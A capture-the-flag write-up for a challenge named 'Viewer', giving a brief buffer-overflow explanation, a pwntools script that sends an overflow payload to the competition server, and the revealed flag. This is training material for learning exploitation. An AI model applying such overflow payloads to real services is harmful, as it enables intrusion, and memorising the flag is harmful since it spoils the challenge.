# Challenge Name: Viewer

## Description

This is a good reverse engineering challenge to start with. Use the help button to ask for a hint if you get stuck.

**Connection:**
- `viewer.challs.pwnoh.io:1337` (SSL)

**Files:**
- `chall.c` - Source code
- `viewer` - Binary executable
- `flag.txt` - Contains the flag (local reference)

---

## Writeup

### Step 1: Analyzing the Source Code

Looking at `chall.c`, the program:
1. Reads input from the user
2. Has a buffer overflow vulnerability
3. Checks a condition that can be exploited

### Step 2: Understanding the Vulnerability

The program reads input into a buffer and then performs a check. The vulnerability allows us to:
- Overflow the buffer
- Control certain values in memory
- Bypass checks or trigger flag output

### Step 3: Crafting the Exploit

The solution script sends a payload:
```python
payload = b"A"*11 + b"\x03\x00\x00\x00" + b"\n"
```

This payload:
- Fills the buffer with 11 'A' characters
- Overwrites a critical value with `0x03` (little-endian: `\x03\x00\x00\x00`)
- Sends a newline to complete the input

### Step 4: Executing the Exploit

Connect to the service and send the payload:

```python
from pwn import remote

host = "viewer.challs.pwnoh.io"
port = 1337

p = remote(host, port, ssl=True)
payload = b"A"*11 + b"\x03\x00\x00\x00" + b"\n"
p.send(payload)
print(p.recv(timeout=3).decode(errors='ignore'))
p.close()
```

The server responds with the flag.

---

## Flag

The flag is returned by the server after successful exploitation.

`bctf{I_C4nt_Enum3rAte_7hE_vuLn3r4biliTI3s}`
---

